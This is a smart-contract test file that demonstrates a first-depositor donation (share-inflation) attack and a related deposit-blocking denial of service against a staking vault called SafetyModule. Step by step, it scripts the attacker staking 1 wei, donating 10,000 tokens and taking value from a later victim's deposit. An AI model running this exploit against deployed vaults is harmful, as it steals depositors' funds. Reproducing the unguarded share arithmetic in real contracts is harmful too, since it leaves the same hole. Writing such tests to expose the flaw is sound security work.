import "../../concrete/BaseCodeCollection.sol";
import "../../abstract/ERC20/IERC20.sol";
import "../../abstract/ERC20/access/Authorizable.sol";
import "../../concrete/Tokens/Token.sol";

contract User {
    function do(address a, string f, variadic args) public returns (variadic) {
        variadic result = address(a).call(f, args);
        return result;
    }
}

contract Describe_SafetyModule_Attacks is Authorizable {

    uint public INFINITY = 2 ** 256 - 1;

    constructor() {
    }

    Mercata m;
    SafetyModule freshSM;

    function beforeAll() public {
        bypassAuthorizations = true;
        m = new Mercata();
        require(address(m) != address(0), "Mercata address is 0");
    }

    function beforeEach() public {
        // Create fresh SafetyModule for each test
        freshSM = new SafetyModule(address(this));
        freshSM.initialize(address(m.lendingRegistry()), address(m.tokenFactory()));
        
        // Create test tokens
        address USDST = m.tokenFactory().createToken("USDST", "USDST Token", [], [], [], "USDST", 0, 18);
        address sUSDST = m.tokenFactory().createToken("sUSDST", "sUSDST Token", [], [], [], "sUSDST", 0, 18);
        
        // Activate tokens
        Token(USDST).setStatus(2);
        Token(sUSDST).setStatus(2);
        
        // Configure lending pool
        m.poolConfigurator().setBorrowableAsset(USDST);
        m.poolConfigurator().setMToken(sUSDST);
        
        // Configure fresh SafetyModule
        freshSM.syncFromRegistry();
        freshSM.setTokens(sUSDST, USDST);
        
        // Whitelist tokens for SafetyModule
        Token(sUSDST).addWhitelist(address(m.adminRegistry()), "mint", address(freshSM));
        Token(sUSDST).addWhitelist(address(m.adminRegistry()), "burn", address(freshSM));
    }

    function it_allows_share_dilution_via_donation() public {
        SafetyModule sm = freshSM;
        address asset = address(sm.asset());
        address sToken = address(sm.sToken());
        
        User attacker = new User();
        User victim = new User();
        
        // Attacker stakes 1 wei
        Token(asset).mint(address(attacker), 1);
        attacker.do(asset, "approve", address(sm), INFINITY);
        attacker.do(address(sm), "stake(uint256,uint256)", 1, 1);
        
        uint attackerShares = IERC20(sToken).balanceOf(address(attacker));
        require(attackerShares == 1, "Attacker should have 1 share");
        
        // Attacker donates 10,000 USDST directly to contract
        uint donationAmount = 10000e18;
        Token(asset).mint(address(attacker), donationAmount);
        attacker.do(asset, "transfer", address(sm), donationAmount);
        
        require(sm.totalAssets() == 10000e18 + 1, "Total assets inflated");
        require(sm.totalShares() == 1, "Only 1 share exists");
        
        // Victim attempts to stake 9,999 USDST - rounds down to 0 shares
        Token(asset).mint(address(victim), 9999e18);
        victim.do(asset, "approve", address(sm), INFINITY);
        
        try victim.do(address(sm), "stake(uint256,uint256)", 9999e18, 1) {
            revert("Stake should fail with SM:dust");
        } catch {}
        
        require(IERC20(sToken).balanceOf(address(victim)) == 0, "Victim blocked from depositing");
        
        // Victim deposits 19,000 USDST to get 1 share
        // sharesOut = (19000e18 * 1) / 10000.000000000000000001 ≈ 1 (rounds down)
        Token(asset).mint(address(victim), 10001e18);
        victim.do(address(sm), "stake(uint256,uint256)", 19000e18, 1);
        
        require(IERC20(sToken).balanceOf(address(victim)) == 1, "Victim got 1 share for 19,000 USDST");
        require(sm.totalShares() == 2, "Total 2 shares for 29,000 USDST");
        
        // Attacker's 1 share is now worth ~14,500 USDST (stole ~4,500 from victim)
        uint attackerShareValue = (attackerShares * sm.totalAssets()) / sm.totalShares();
        require(attackerShareValue >= 14500e18, "Attacker's 1 share worth >=14,500 USDST");
        require(attackerShareValue > 10000e18 + 4000e18, "Profit >4,000 USDST from 1 wei investment");
    }

    function it_blocks_small_deposits_causing_dos() public {
        SafetyModule sm = freshSM;
        address asset = address(sm.asset());
        
        User attacker = new User();
        
        // Attacker stakes 1 wei and donates 10,000 USDST
        Token(asset).mint(address(attacker), 10000e18 + 1);
        attacker.do(asset, "approve", address(sm), INFINITY);
        attacker.do(address(sm), "stake(uint256,uint256)", 1, 1);
        attacker.do(asset, "transfer", address(sm), 10000e18);
        
        // Test various deposit amounts below 10,000 USDST
        uint[] memory amounts = [1e18, 10e18, 100e18, 1000e18, 5000e18, 9999e18];
        
        for (uint i = 0; i < amounts.length; i++) {
            User victim = new User();
            Token(asset).mint(address(victim), amounts[i]);
            victim.do(asset, "approve", address(sm), INFINITY);
            
            // All deposits below ~10,000 USDST will revert with SM:dust
            try victim.do(address(sm), "stake(uint256,uint256)", amounts[i], 1) {
                revert("Deposit should fail");
            } catch {}
            
            require(IERC20(address(sm.sToken())).balanceOf(address(victim)) == 0, "Victim blocked");
        }
        
        // Only deposits > 10,000 USDST can succeed
        User richUser = new User();
        Token(asset).mint(address(richUser), 10001e18);
        richUser.do(asset, "approve", address(sm), INFINITY);
        richUser.do(address(sm), "stake(uint256,uint256)", 10001e18, 1);
        
        require(IERC20(address(sm.sToken())).balanceOf(address(richUser)) == 1, "Only deposits >10K succeed");
    }

}